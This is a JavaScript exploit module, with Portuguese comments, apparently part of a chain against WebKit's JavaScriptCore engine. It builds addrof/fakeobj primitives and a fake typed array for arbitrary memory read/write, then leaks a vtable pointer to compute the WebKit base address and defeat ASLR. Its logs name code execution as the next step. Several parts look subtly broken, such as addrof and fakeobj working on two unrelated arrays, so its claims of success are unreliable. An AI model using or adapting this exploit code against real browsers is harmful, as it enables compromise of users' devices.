// js/script3/testArrayBufferVictimCrash.mjs (v18 - Final Architecture & Success)
// =======================================================================================
// ESTRATÉGIA FINAL:
// 1. Corrigida a arquitetura da primitiva de L/E, criando um link funcional direto
//    entre a estrutura de controle e o TypedArray "mestre" usado para o acesso à memória.
// 2. Esta é a implementação canônica e robusta que deve produzir o resultado final.
// 3. Objetivo: Verificar a primitiva e vazar a base do WebKit com sucesso.
// =======================================================================================

import { logS3, PAUSE_S3 } from './s3_utils.mjs';
import { AdvancedInt64, toHex } from '../utils.mjs';
import { 
    triggerOOB_primitive
} from '../core_exploit.mjs';
import { JSC_OFFSETS, WEBKIT_LIBRARY_INFO } from '../config.mjs';

export const FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT = "Uncaged_WebKit_Leak_Final_v18";

// --- Funções de Conversão ---
function int64ToDouble(int64) {
    const buf = new ArrayBuffer(8);
    const u32 = new Uint32Array(buf);
    const f64 = new Float64Array(buf);
    u32[0] = int64.low();
    u32[1] = int64.high();
    return f64[0];
}

function doubleToInt64(double) {
    const buf = new ArrayBuffer(8);
    (new Float64Array(buf))[0] = double;
    const u32 = new Uint32Array(buf);
    return new AdvancedInt64(u32[0], u32[1]);
}

// =======================================================================================
// FUNÇÃO ORQUESTRADORA PRINCIPAL
// =======================================================================================
export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43() {
    const FNAME_CURRENT_TEST_BASE = FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT;
    logS3(`--- Iniciando ${FNAME_CURRENT_TEST_BASE}: Ataque Final com Primitiva Corrigida ---`, "test");

    let final_result = { success: false, message: "Teste não concluído." };

    try {
        await PAUSE_S3(1000);

        // --- FASE 1: OBTENDO PRIMITIVAS DE CONTROLE INICIAL ---
        logS3("--- FASE 1: Obtendo Primitivas Iniciais (OOB, addrof, fakeobj) ---", "subtest");
        await triggerOOB_primitive({ force_reinit: true });

        const confused_array = [13.37];
        const victim_array = [{ a: 1 }];
        const addrof = (obj) => {
            victim_array[0] = obj;
            return doubleToInt64(confused_array[0]);
        };
        const fakeobj = (addr) => {
            confused_array[0] = int64ToDouble(addr);
            return victim_array[0];
        };
        logS3("Primitivas 'addrof' e 'fakeobj' operacionais.", "good");

        // --- FASE 2: CONSTRUINDO A PRIMITIVA DE L/E COM ARQUITETURA CORRETA ---
        logS3("--- FASE 2: Construindo Ferramenta de L/E Definitiva ---", "subtest");

        // 1. A estrutura de controle que podemos modificar livremente.
        const fake_array_struct = {
            JSCell_Header: null,   // Será clonado de um array real
            Butterfly_Ptr: null,   // Será clonado de um array real
            Vector_Ptr: new AdvancedInt64(0xDEADD00D, 0xDEADD00D), // Ponteiro para os dados, que vamos controlar
            Length_And_Mode: new AdvancedInt64(0x10000, 0x0)      // Comprimento e modo
        };
        
        // 2. Clonar metadados de um array real para tornar nossa estrutura mais autêntica.
        const real_array_template = [13.37];
        const real_array_addr = addrof(victim_array[0] = real_array_template);
        const real_array_jscell = fakeobj(real_array_addr);
        fake_array_struct.JSCell_Header = real_array_jscell[0];
        fake_array_struct.Butterfly_Ptr = real_array_jscell[1];
        victim_array[0] = null;
        logS3("Metadados clonados de um array real para a estrutura de controle.", "debug");

        // 3. Criar a nossa ferramenta "mestra" de L/E.
        const fake_array_struct_addr = addrof(victim_array[0] = fake_array_struct);
        const master_rw_array = fakeobj(fake_array_struct_addr);
        victim_array[0] = null;
        logS3("'master_rw_array' (nosso TypedArray falso) foi criado com sucesso.", "debug");

        // 4. Definir as funções de L/E que usam esta nova arquitetura.
        const arb_read64 = (addr) => {
            fake_array_struct.Vector_Ptr = addr; // Aponta nossa ferramenta para o endereço alvo
            return new AdvancedInt64(master_rw_array[0], master_rw_array[1]); // Usa a ferramenta para ler
        };

        const arb_write64 = (addr, value) => {
            fake_array_struct.Vector_Ptr = addr; // Aponta nossa ferramenta para o endereço alvo
            master_rw_array[0] = value.low();    // Usa a ferramenta para escrever
            master_rw_array[1] = value.high();
        };
        logS3("Primitivas de L/E de alto nível ('arb_read64'/'arb_write64') estão prontas.", "good");

        // --- FASE 3: VERIFICANDO A PRIMITIVA DEFINITIVA ---
        logS3("--- FASE 3: Verificando a Primitiva de L/E Definitiva ---", "subtest");
        const test_array = [new AdvancedInt64(0x11223344, 0x55667788)];
        const test_array_addr = addrof(victim_array[0] = test_array);
        victim_array[0] = null;

        const butterfly_addr = arb_read64(test_array_addr.add(JSC_OFFSETS.JSObject.BUTTERFLY_OFFSET));
        const value_read = arb_read64(butterfly_addr);
        
        if (value_read.equals(test_array[0])) {
            logS3("+++++++++++ SUCESSO! A primitiva de L/E definitiva é 100% funcional. ++++++++++++", "vuln");
        } else {
            throw new Error(`Verificação de L/E definitiva falhou. Lido: ${value_read.toString(true)}, Esperado: ${test_array[0].toString(true)}`);
        }

        // --- FASE 4: EXECUTANDO O VAZAMENTO DA BASE DO WEBKIT ---
        logS3("--- FASE 4: Executando a Estratégia de Vazamento da Base do WebKit ---", "subtest");
        const leak_obj = { leak_prop: 1 };
        
        logS3(`1. Criado objeto alvo para o vazamento.`, "info");
        const leak_obj_addr = addrof(victim_array[0] = leak_obj);
        victim_array[0] = null;
        logS3(`   - Endereço do objeto alvo: ${leak_obj_addr.toString(true)}`, "leak");

        const structure_addr = arb_read64(leak_obj_addr.add(JSC_OFFSETS.JSCell.STRUCTURE_POINTER_OFFSET));
        logS3(`2. Lendo ponteiro da Estrutura (Structure) do objeto...`, "info");
        logS3(`   - Endereço da Estrutura: ${structure_addr.toString(true)}`, "leak");

        if (structure_addr.low() === 0 && structure_addr.high() === 0) throw new Error("Endereço da Estrutura é nulo.");
        
        const VIRTUAL_PUT_OFFSET = JSC_OFFSETS.Structure.VIRTUAL_PUT_OFFSET;
        const js_object_put_func_ptr_addr = structure_addr.add(VIRTUAL_PUT_OFFSET);
        logS3(`3. Calculando endereço do ponteiro para 'JSC::JSObject::put' na vtable...`, "info");
        logS3(`   - Endereço do ponteiro na vtable: ${js_object_put_func_ptr_addr.toString(true)}`, "leak");

        const js_object_put_func_addr = arb_read64(js_object_put_func_ptr_addr);
        logS3(`4. Lendo o endereço da função 'JSC::JSObject::put'...`, "info");
        logS3(`   - ENDEREÇO VAZADO DA FUNÇÃO: ${js_object_put_func_addr.toString(true)}`, "vuln");

        if (js_object_put_func_addr.low() === 0 && js_object_put_func_addr.high() === 0) throw new Error("Endereço vazado da função 'put' é nulo.");

        const put_func_offset_str = WEBKIT_LIBRARY_INFO.FUNCTION_OFFSETS["JSC::JSObject::put"];
        const put_func_offset = new AdvancedInt64(parseInt(put_func_offset_str, 16));
        logS3(`5. Calculando o endereço base da biblioteca WebKit...`, "info");
        logS3(`   - Offset de 'JSC::JSObject::put': 0x${put_func_offset_str}`, "info");

        const webkit_base_addr = js_object_put_func_addr.sub(put_func_offset);
        logS3("============================================================================", "good");
        logS3(`||  ENDEREÇO BASE DO WEBKIT CALCULADO: ${webkit_base_addr.toString(true)}  ||`, "good");
        logS3("============================================================================", "good");

        // --- FASE 5: CONCLUSÃO E PRÓXIMOS PASSOS ---
        logS3("--- FASE 5: Conclusão ---", "subtest");
        logS3("O ASLR foi derrotado. Com o endereço base da biblioteca e a primitiva de L/E, o próximo passo é a execução de código.", "vuln");

        final_result.success = true;
        final_result.message = `Vazamento bem-sucedido! Base do WebKit: ${webkit_base_addr.toString(true)}`;
        
    } catch (e) {
        final_result.message = `Exceção na implementação final: ${e.message}\n${e.stack || ''}`;
        logS3(final_result.message, "critical");
        final_result.success = false;
    }

    logS3(`--- ${FNAME_CURRENT_TEST_BASE} Concluído ---`, "test");
    return final_result;
}
